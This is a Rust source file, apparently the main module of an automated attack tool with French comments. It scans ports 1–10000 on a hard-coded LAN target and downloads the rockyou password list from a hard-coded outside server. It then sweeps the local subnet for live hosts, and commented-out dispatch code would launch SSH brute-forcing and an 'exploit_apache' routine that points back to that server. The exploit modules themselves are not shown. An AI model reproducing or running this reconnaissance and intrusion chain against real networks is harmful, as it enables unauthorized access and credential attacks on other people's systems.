mod ssh;
mod utils;
mod web;

use std::error::Error;

use std::net::{IpAddr, TcpStream};
use crate::utils::NetworkInterface;


fn scan_ports(target_ip: &str) -> Vec<u16> {
    println!("[x] - Scanning ports ");
    let mut open_ports = Vec::new();

    for port in 1..=10000 {
        let address = format!("{}:{}", target_ip, port);
        match TcpStream::connect(address) {
            Ok(_) => {
                println!("Port {} is open", port);
                open_ports.push(port);
            }
            Err(_) => {} // Ignore errors, assuming port is closed
        }
    }

    open_ports
}


fn get_net_int() -> Result<NetworkInterface, Box<dyn Error>> {

    match utils::get_current_ip() {
        Some(networkInt) => {
            Ok(networkInt)
        },
        None => {
            Err("No interface found".into())
        },
    }

}



fn get_ip_up(){

}

#[tokio::main]
async fn main() {
    let ip_target = "192.168.1.122";
    let ip_srv = "51.77.193.65";
    let port = "8000";

    //let port_ouvert = scan_ports(ip_target); // donne un tableau de port ouvert

    //println!("Open ports: {:?}", port_ouvert);

    utils::get_rockyou(ip_srv, port)
        .await
        .expect("error : dl rockyou");

    let interface = get_net_int();
    match interface {
        Ok(NetworkInterface) => {
            println!("[x] - IP: {}", NetworkInterface.ip_addr);
            println!("[x] - mask: {:?}", NetworkInterface.netmask);

          match utils::scan(NetworkInterface.ip_addr, NetworkInterface.netmask).await {

                Ok(ip_up) => {
                    println!("{:?}", ip_up);
                    println!("[x] - Scan terminé");
                }
                Err(e) => {
                    eprintln!("[x] - Erreur lors du scan: {}", e);
                }
          }
            //utils::up_or_not(NetworkInterface.ip_addr);













            /*
                match port_ouvert[1] {
                    //22 => {
                    //    ssh::ssh_bruteforce(ip_address, "bibli/").await;
                    //},
                    80 => {
                        web::exploit_apache(ip_target, ip_srv).await;
                    }

                    _ => {}
                }
            */





        }
        Err(e) => {
            eprintln!("Pas d'interface : {}", e);
        }
    }




}
